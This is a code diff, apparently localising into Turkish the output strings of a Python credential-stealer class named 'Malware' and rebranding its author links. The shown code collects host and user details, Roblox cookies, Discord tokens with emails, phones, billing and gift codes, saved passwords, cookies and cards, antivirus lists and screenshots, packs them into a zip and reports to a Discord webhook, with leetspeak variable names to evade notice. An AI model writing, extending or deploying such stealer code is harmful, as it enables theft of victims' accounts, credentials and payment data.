@@ -84,18 +84,18 @@ class Malware:
     def send_webhook(self, gofile_url=None, file_path=None):
         try:
             embed = {
-                "title": "• Basit sistem bilgileri:",
+                "title": ":red_crown1: Basit sistem bilgileri:",
                 "color": 0xE53935,
                 "fields": [
                     {"name": "Ana makine adı:", "value": f"```{socket.gethostname()}```", "inline": True},
-                    {"name": "İsim:", "value": f"```{getpass.getuser()}```", "inline": True},
+                    {"name": "Isim:", "value": f"```{getpass.getuser()}```", "inline": True},
                     {"name": "Makine:", "value": f"```{platform.machine()}```", "inline": True},
                     {"name": "Sistem:", "value": f"```{platform.system()}```", "inline": True},
-                    {"name": "Sürüm:", "value": f"```{platform.release()}```", "inline": True},
+                    {"name": "Surum:", "value": f"```{platform.release()}```", "inline": True},
                     {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
                 ],
                 "footer": {
-                    "text": "• Im returning by death. | @Croxlv"
+                    "text": ":Rem: Im returning by death. | @Croxlv"
                 }
             }
 
@@ -106,14 +106,14 @@ class Malware:
                         {
                             "type": 2,              
                             "style": 5,                    
-                            "label": "Dosya İndir",       
+                            "label": "Dosya Indir",       
                             "url": gofile_url        
                         },
                         {
                             "type": 2,              
                             "style": 5,                    
-                            "label": "Github",       
-                            "url": "https://github.com/Croxlv"        
+                            "label": "GunsLol",       
+                            "url": "https://guns.lol/croxlv"        
                         }
                     ]
                 }
@@ -436,7 +436,7 @@ Public IP infos:
             info = False
             system_infos = "No infos."
             
-        zip_file.writestr(f"system_infos.txt", system_infos)
+        zip_file.writestr(f"sistem_bilgisi.txt", system_infos)
         return info
     
     @staticmethod
@@ -486,20 +486,20 @@ Public IP infos:
                     username = api.get('name', "None")
                     display_name = api.get('displayName', "None")
 
-                    file_roblox_account += f"""Roblox Account n°{number_roblox_account}:
+                    file_roblox_account += f"""Roblox Hesaplari n°{number_roblox_account}:
 - Navigator     : {browser_func.__name__}
     - Id            : {user_id}
-    - Username      : {username}
-    - DisplayName   : {display_name}
-    - Cookie        : {cookie}
+    - Isim      : {username}
+    - Takma Ad   : {display_name}
+    - Kurabiye        : {cookie}
                         """
             except Exception:
                 continue
 
         if not cookie_list:
-            file_roblox_account = "No roblox cookie found."
+            file_roblox_account = "Roblox kurabiyesi bulunamadı."
 
-        zip_file.writestr(f"Roblox Accounts ({number_roblox_account}).txt", file_roblox_account)
+        zip_file.writestr(f"Roblox Hesapları ({number_roblox_account}).txt", file_roblox_account)
         return number_roblox_account
         
     @staticmethod
@@ -720,24 +720,24 @@ Public IP infos:
             except: software_name, path = "Unknown", "Unknown"
 
             file_discord_account = file_discord_account + f"""
-Discord Account n°{str(number_discord_account)}:
-- Path Found      : {path}
-- Software        : {software_name}
-- Token           : {token_d15c0rd}
-- Username        : {u53rn4m3_d15c0rd}
-- Display Name    : {d15pl4y_n4m3_d15c0rd}
-- Id              : {us3r_1d_d15c0rd}
-- Email           : {em4i1_d15c0rd}
-- Email Verified  : {em4il_v3rifi3d_d15c0rd}
-- Phone           : {ph0n3_d15c0rd}
-- Nitro           : {n1tr0_d15c0rd}
-- Language        : {c0untry_d15c0rd}
-- Billing         : {p4ym3nt_m3th0d5_d15c0rd}
-- Gift Code       : {g1ft_c0d35_d15c0rd}
-- Profile Picture : {av4t4r_ur1_d15c0rd}
-- Multi-Factor Authentication : {mf4_d15c0rd}
+Discord Hesabı n°{str(number_discord_account)}:
+- Bulundugu Klasor      : {path}
+- Tarayıci              : {software_name}
+- Token                 : {token_d15c0rd}
+- Isim                  : {u53rn4m3_d15c0rd}
+- Takma ad              : {d15pl4y_n4m3_d15c0rd}
+- Id                    : {us3r_1d_d15c0rd}
+- Email                 : {em4i1_d15c0rd}
+- Email Dogrulamasi     : {em4il_v3rifi3d_d15c0rd}
+- Telefon               : {ph0n3_d15c0rd}
+- Nitro                 : {n1tr0_d15c0rd}
+- Dil                   : {c0untry_d15c0rd}
+- Fatura                : {p4ym3nt_m3th0d5_d15c0rd}
+- Hediye kodu           : {g1ft_c0d35_d15c0rd}
+- Profil Resmi          : {av4t4r_ur1_d15c0rd}
+- Ikı asamalı dogrulama : {mf4_d15c0rd}
 """
-        zip_file.writestr(f"Discord Accounts ({number_discord_account}).txt", file_discord_account)
+        zip_file.writestr(f"Discord Hesaplari ({number_discord_account}).txt", file_discord_account)
 
         return number_discord_account
 
@@ -1213,7 +1213,7 @@ Discord Account n°{str(number_discord_account)}:
             file_cards     = "\n".join(file_cards)
         
         if number_passwords != None:
-            zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)
+            zip_file.writestr(f"Sifreler ({number_passwords}).txt", file_passwords)
 
         if number_cookies != None:
             zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)
@@ -1269,11 +1269,11 @@ Discord Account n°{str(number_discord_account)}:
                     break
 
         if found_antivirus:
-            antivirus_info = "Antivirus software found on the system:\n- " + "\n- ".join(found_antivirus)
+            antivirus_info = "Antivirus bulundu:\n- " + "\n- ".join(found_antivirus)
         else:
-            antivirus_info = "No antivirus software found on the system."
+            antivirus_info = "Sistemde antivirus bulunumadı."
 
-        zip_file.writestr("Antivirus Info.txt", antivirus_info)
+        zip_file.writestr("Antivirus Bilgisi.txt", antivirus_info)
 
         return len(found_antivirus)
 
@@ -1395,7 +1395,7 @@ Discord Account n°{str(number_discord_account)}:
     @staticmethod
     def Screenshot(zip_file):
         path_temp = Paths().temp
-        screenshot_image_path = os.path.join(path_temp, "screenshot_capture.png")
+        screenshot_image_path = os.path.join(path_temp, "ekrangoruntusu.png")
 
         try:
             user32 = ctypes.windll.user32
